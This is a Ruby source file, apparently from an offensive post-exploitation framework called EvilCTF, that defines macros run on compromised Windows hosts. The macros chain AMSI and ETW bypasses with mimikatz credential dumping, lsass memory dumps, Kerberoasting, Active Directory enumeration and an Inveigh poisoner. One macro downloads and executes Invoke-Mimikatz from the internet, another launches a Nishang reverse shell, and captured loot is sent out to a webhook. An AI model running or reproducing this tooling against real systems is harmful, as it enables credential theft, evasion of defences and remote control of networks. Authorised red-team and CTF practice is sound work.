# frozen_string_literal: true

module EvilCTF
  module Tools
    module MacroEngine
      MACRO_DEPENDENCIES = {
        'kerberoast' => ['rubeus'],
        'dump_creds' => ['mimikatz'],
        'lsass_dump' => ['procdump'],
        'sharphound_all' => ['sharphound'],
        'seatbelt_all' => ['seatbelt'],
        'rubeus_klist' => ['rubeus'],
        'inveigh_start' => ['inveigh'],
        'socks_init' => ['socksproxy'],
        'cred_harvest' => ['mimikatz'],
        'nishang_rev' => ['nishang'],
        'powerview_all' => ['powerview'],
        'dom_enum' => ['powerview']
      }.freeze

      PLACEHOLDER_PATTERN = /\[(AttackerIP|AttackerPort|NishangRevRemote|InveighRemote)\]/.freeze

      def build_macros
        {
          'kerberoast' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
          'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
          'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe "C:\\Users\\Public\\lsass.dmp"'],
          'invoke-mimikatz' => [
            BYPASS_4MSI_PS,
            ETW_BYPASS_PS,
            'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")',
            'Invoke-Mimikatz -DumpCreds'
          ],
          'sharphound_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\SharpHound.exe" -c all 2>$null'],
          'seatbelt_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\Seatbelt.exe" -group=all 2>$null'],
          'rubeus_klist' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" klist 2>$null'],
          'bypass-etw' => [ETW_BYPASS_PS],
          'bypass-4msi' => [BYPASS_4MSI_PS],
          'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, INVEIGH_START_PS],
          'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'Import-Module "C:\\Users\\Public\\socks.ps1"; Invoke-SocksProxy -BindPort 1080'],
          'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit 2>$null'],
          'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, NISHANG_REV_PS],
          'powerview_all' => [BYPASS_4MSI_PS, POWERVIEW_ALL_PS],
          'dom_enum' => [BYPASS_4MSI_PS, DOM_ENUM_PS]
        }
      end

      def validate_macro(name, replacements: {}, check_local_tools: true)
        macro_name = name.to_s.downcase
        macro = @macros[macro_name]
        unless macro
          return {
            name: macro_name,
            ok: false,
            errors: ["Unknown macro: #{name}"],
            warnings: [],
            resolved_steps: [],
            placeholders: [],
            dependencies: []
          }
        end

        errors = []
        warnings = []
        placeholders = []
        resolved_steps = []

        macro.each do |step|
          resolved, unresolved, used = resolve_macro_step_static(step, replacements)
          placeholders.concat(used)
          unresolved.each do |key|
            errors << "Missing required placeholder value: #{key}"
          end
          resolved_steps << resolved
        end

        dependencies = macro_dependencies(macro_name).map do |tool_key|
          available = true
          path = nil
          if check_local_tools
            path = EvilCTF::Tools.find_tool_on_disk(tool_key)
            available = !path.nil? && !path.to_s.empty?
          end

          unless available
            warnings << "Local dependency not found for #{tool_key}; staging/download may be required at runtime"
          end

          {
            tool: tool_key,
            available: available,
            local_path: path
          }
        end

        {
          name: macro_name,
          ok: errors.empty?,
          errors: errors.uniq,
          warnings: warnings.uniq,
          resolved_steps: resolved_steps,
          placeholders: placeholders.uniq,
          dependencies: dependencies
        }
      end

      def validate_macros(names: nil, replacements: {}, check_local_tools: true)
        selected = if names.nil? || names.empty?
                     list_macros
                   else
                     names.map(&:to_s).map(&:downcase)
                   end

        results = selected.map do |macro_name|
          validate_macro(
            macro_name,
            replacements: replacements,
            check_local_tools: check_local_tools
          )
        end

        {
          ok: results.all? { |r| r[:ok] },
          total: results.length,
          passed: results.count { |r| r[:ok] },
          failed: results.count { |r| !r[:ok] },
          results: results
        }
      end

      def expand_macro(name, shell, webhook: nil, loot_event_logfile: nil)
        macro_name = name.downcase
        macro = @macros[macro_name]
        return false unless macro

        puts "[*] Expanding macro: #{name}"
        replacements = prepare_macro(macro_name, shell)
        return true if replacements == false

        replacements ||= {}
        macro.each do |step|
          begin
            resolved_step = resolve_macro_step(step, replacements)
            exec_res = EvilCTF::Execution.run(shell, resolved_step, timeout: 120)
            puts exec_res.output.to_s.strip
            matches = EvilCTF::Tools.grep_output(exec_res.output)
            if matches.any?
              EvilCTF::Tools.save_loot(matches, event_logfile: loot_event_logfile)
              EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
            end
          rescue StandardError => e
            puts "[!] Macro step failed: #{e.message}"
            return false
          end
        end
        true
      end

      def prepare_macro(name, shell)
        case name
        when 'nishang_rev'
          remote_path = locate_nishang_rev_remote(shell)
          return { 'NishangRevRemote' => remote_path } if remote_path

          cleanup_partial_nishang_stage(shell)
          return false unless EvilCTF::Tools.safe_autostage('nishang', shell, {}, nil)

          remote_path = locate_nishang_rev_remote(shell)
          return { 'NishangRevRemote' => remote_path } if remote_path

          puts '[!] Nishang staging completed, but Invoke-PowerShellTcp.ps1 was not found on target'
          return false
        when 'inveigh_start'
          remote_path = locate_inveigh_remote(shell)
          return { 'InveighRemote' => remote_path } if remote_path

          return false unless EvilCTF::Tools.safe_autostage('inveigh', shell, {}, nil)

          remote_path = locate_inveigh_remote(shell)
          return { 'InveighRemote' => remote_path } if remote_path

          puts '[!] Inveigh staging completed, but Inveigh.ps1 was not found on target'
          return false
        end

        {}
      rescue StandardError => e
        puts "[!] Macro preparation failed: #{e.message}"
        false
      end

      def cleanup_partial_nishang_stage(shell)
        remote_root = EvilCTF::Utils.escape_ps_string(TOOL_REGISTRY['nishang'][:recommended_remote])
        cleanup_cmd = <<~PS
          if (Test-Path '#{remote_root}') {
            Remove-Item '#{remote_root}' -Recurse -Force -ErrorAction SilentlyContinue
          }
        PS
        EvilCTF::Execution.run(shell, cleanup_cmd, timeout: 30)
      rescue StandardError => e
        puts "[!] Nishang cleanup warning: #{e.message}"
      end

      def locate_nishang_rev_remote(shell)
        search_root = TOOL_REGISTRY['nishang'][:recommended_remote].rpartition('\\').first
        search_root = EvilCTF::Utils.escape_ps_string(search_root)
        locate_cmd = <<~PS
          $match = Get-ChildItem -Path '#{search_root}' -Filter 'Invoke-PowerShellTcp.ps1' -Recurse -ErrorAction SilentlyContinue |
            Select-Object -First 1 -ExpandProperty FullName
          if ($match) { "FOUND::$match" } else { 'MISSING' }
        PS

        locate_res = EvilCTF::Execution.run(shell, locate_cmd, timeout: 30)
        found_line = locate_res.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
        found_line&.sub('FOUND::', '')&.strip
      end

      def locate_inveigh_remote(shell)
        remote = EvilCTF::Utils.escape_ps_string(INVEIGH_REMOTE)
        check_cmd = "if (Test-Path '#{remote}') { 'FOUND::#{remote}' } else { 'MISSING' }"
        check_res = EvilCTF::Execution.run(shell, check_cmd, timeout: 20)
        found_line = check_res.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
        found_line&.sub('FOUND::', '')&.strip
      end

      def resolve_macro_step(step, replacements)
        step.to_s.gsub(PLACEHOLDER_PATTERN) do
          key = Regexp.last_match(1)
          replacements[key] ||= prompt_macro_value(key, default: macro_placeholder_default(key))
        end
      end

      def resolve_macro_step_static(step, replacements)
        unresolved = []
        used = []
        resolved = step.to_s.gsub(PLACEHOLDER_PATTERN) do
          key = Regexp.last_match(1)
          used << key
          replacement = replacement_value_for(key, replacements)
          if replacement.nil? || replacement.to_s.strip.empty?
            unresolved << key
            "[#{key}]"
          else
            replacement
          end
        end

        [resolved, unresolved.uniq, used.uniq]
      end

      def replacement_value_for(key, replacements)
        replacements[key] || replacements[key.to_sym] || macro_placeholder_default(key)
      end

      def prompt_macro_value(key, default: nil)
        label = key.gsub(/([a-z])([A-Z])/, '\\1 \\2')
        prompt = default ? "#{label} [#{default}]: " : "#{label}: "
        value = Readline.readline(prompt, true).to_s.strip
        value = default if value.empty? && default
        raise ArgumentError, "#{label} is required" if value.nil? || value.empty?

        value
      end

      def macro_placeholder_default(key)
        case key
        when 'AttackerPort'
          '4444'
        when 'NishangRevRemote'
          NISHANG_REV_REMOTE
        when 'InveighRemote'
          INVEIGH_REMOTE
        end
      end

      def macro_dependencies(name)
        MACRO_DEPENDENCIES[name.to_s.downcase] || []
      end

      def list_macros
        @macros.keys.sort
      end
    end
  end
end
